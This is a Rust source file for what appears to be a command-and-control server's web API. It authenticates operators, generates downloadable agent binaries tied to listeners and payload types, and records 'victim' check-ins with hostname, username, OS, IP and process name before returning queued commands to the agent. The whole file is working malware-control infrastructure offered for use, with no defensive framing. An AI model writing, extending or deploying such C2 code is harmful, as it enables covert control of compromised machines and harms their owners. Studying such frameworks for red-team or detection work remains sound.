use crate::admin::models::{AgentCheckinResponse, ApiResponse, VictimCheckinInfo};
use crate::admin::routes::AppState;
use crate::agents::agent_handler::{AgentConfig, AgentHandler};
use actix_web::{
    get, post,
    web::{Data, Json},
    HttpRequest, HttpResponse, Responder,
};
use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize)]
pub struct GenerateAgentRequest {
    pub listener_name: String,
    pub payload_type: String,
    pub config: AgentConfig,
}

#[get("/api/agents")]
pub async fn list_agents(state: Data<AppState>, req: HttpRequest) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let agents = state.agent_handler.list_agents();
    HttpResponse::Ok().json(agents)
}

#[post("/api/generate")]
pub async fn generate_agent(
    state: Data<AppState>,
    payload: Json<GenerateAgentRequest>,
    req: HttpRequest,
) -> impl Responder {
    let claims = match state.jwt_manager.authenticate(&req, &state.database) {
        Ok(c) => c,
        Err(e) => {
            return HttpResponse::Unauthorized().json(ApiResponse {
                success: false,
                message: e.to_string(),
            });
        }
    };

    log::info!(
        "[+] Generating agent for listener '{}' with type '{}' by user '{}'",
        payload.listener_name,
        payload.payload_type,
        claims.sub
    );

    match state.agent_handler.create_agent_with_config(
        &payload.listener_name,
        &payload.payload_type,
        &payload.config,
        &state.database,
    ) {
        Ok(agent_data) => {
            let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");

            log::info!(
                "[+] Agent generated for listener '{}' by user '{}'",
                payload.listener_name,
                claims.sub
            );

            HttpResponse::Ok()
                .content_type("application/octet-stream")
                .append_header((
                    "Content-Disposition",
                    format!(
                        "attachment; filename=\"agent_{}_{}.bin\"",
                        payload.payload_type, timestamp
                    ),
                ))
                .body(agent_data)
        }
        Err(e) => {
            log::error!("[!] Failed to generate agent: {}", e);
            HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to generate agent: {}", e),
            })
        }
    }
}

#[post("/api/agent/checkin")]
pub async fn agent_checkin(
    state: Data<AppState>,
    payload: Json<VictimCheckinInfo>,
) -> impl Responder {
    log::info!(
        "[+] Agent check-in: {} from {}@{} ({})",
        payload.agent_id,
        payload.username,
        payload.hostname,
        payload.ip_address
    );

    if let Err(e) = state.database.update_victim_info(
        &payload.agent_id,
        &payload.hostname,
        &payload.username,
        &payload.os,
        &payload.ip_address,
        &payload.process_name,
    ) {
        log::error!("[!] Failed to update victim info: {}", e);
    }

    if let Some(mut agent_info) = state.agent_handler.get_agent(&payload.agent_id) {
        agent_info.hostname = Some(payload.hostname.clone());
        agent_info.username = Some(payload.username.clone());
        agent_info.ip = Some(payload.ip_address.clone());
        agent_info.process_name = Some(payload.process_name.clone());
        agent_info.last_seen = AgentHandler::get_current_timestamp();

        state
            .agent_handler
            .update_agent(&payload.agent_id, agent_info, Some(&state.database));
    }

    if let Err(e) = state.database.log_agent_action(
        &payload.agent_id,
        "check_in",
        Some(&format!("from {}@{}", payload.username, payload.hostname)),
        None,
    ) {
        log::warn!("[!] Failed to log agent check-in: {}", e);
    }

    let commands = match state.database.get_pending_commands(&payload.agent_id) {
        Ok(cmds) => {
            log::info!(
                "[+] Found {} pending command(s) for agent {}",
                cmds.len(),
                payload.agent_id
            );

            for (cmd_id, _) in &cmds {
                if let Err(e) = state.database.mark_command_sent(*cmd_id) {
                    log::warn!("[!] Failed to mark command {} as sent: {}", cmd_id, e);
                }
            }

            cmds.into_iter().map(|(_, cmd)| cmd).collect()
        }
        Err(e) => {
            log::error!("[!] Failed to get pending commands: {}", e);
            Vec::new()
        }
    };

    HttpResponse::Ok().json(AgentCheckinResponse {
        success: true,
        message: "Check-in successful".to_string(),
        commands,
    })
}
